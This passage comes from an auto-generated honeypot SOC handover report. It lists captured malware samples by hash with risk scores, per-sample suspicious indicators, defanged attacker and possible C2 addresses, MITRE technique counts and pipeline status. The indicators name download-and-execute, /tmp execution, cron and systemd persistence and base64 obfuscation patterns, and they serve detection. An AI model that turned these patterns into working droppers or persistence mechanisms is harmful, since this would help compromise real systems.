| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 38/100 | 🟢 LOW | **21/75** 🔴 |
| `1ff7c192f591fe63fae453eb8a91da94b276376d3880e3078c3c5a20ba6b45ab` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ff7c192f591fe63...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |

**Suspicious Indicators — HIGH Severity Samples:**

_`05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` (05af569c3595b01e0724bc96...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/.kworker`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.161[.]96:55487`

_`07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` (07c0a0af63dde8dc2e36dc58...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` (0fad00ddec16b67f3131aa4e...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1bd9924c3e29ae4...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Hardware recon` — `cat /proc/cpuinfo`
- `IP:Port (possible C2)` — `198.144.179[.]82:80`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `125.129.1[.]253` | KR | Korea Telecom | **100** ⚠️ | 14 |
| `139.59.151[.]17` | DE | DigitalOcean, LLC | **100** ⚠️ | 2 |
| `80.94.92[.]179` | RO | TECHOFF SRV LIMITED | **100** ⚠️ | 50 |
| `112.163.135[.]28` | KR | Korea Telecom | **100** ⚠️ | 6 |
| `185.9.139[.]102` | AL | ABnet Sh.p.k | **100** ⚠️ | 0 |
| `3.129.187[.]38` | US | Amazon Technologies Inc. | **100** ⚠️ | 50 |
| `36.140.151[.]122` | CN | China Mobile Communications Corporation | **100** ⚠️ | 5 |
| `45.79.115[.]134` | US | Linode | **100** ⚠️ | 50 |
| `78.92.226[.]112` | HU | Magyar Telekom Plc. | **100** ⚠️ | 2 |
| `64.225.72[.]42` | NL | DigitalOcean, LLC | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 212 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 156 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 56 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 54 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 12 |

---

## 🔕 False Positive Summary (57 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 16 |
| AbuseIPDB score 15 below threshold 25 | 1 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| AbuseIPDB score 17 below threshold 25 | 2 |
| AbuseIPDB score 2 below threshold 25 | 1 |
| AbuseIPDB score 21 below threshold 25 | 2 |
| AbuseIPDB score 24 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 30 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 368 cases |
| Tool 34  | Credential Extractor        | ✅ 4467 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 25 fingerprints |
| Tool 36  | Command Clustering          | ✅ 16 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 254 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 57 filtered (15.5%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 118 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 31 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 151 priority case(s) shown individually · 146 recon entry/entries in table (8 group(s) consolidating 22 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-10-13T18:39:59Z_
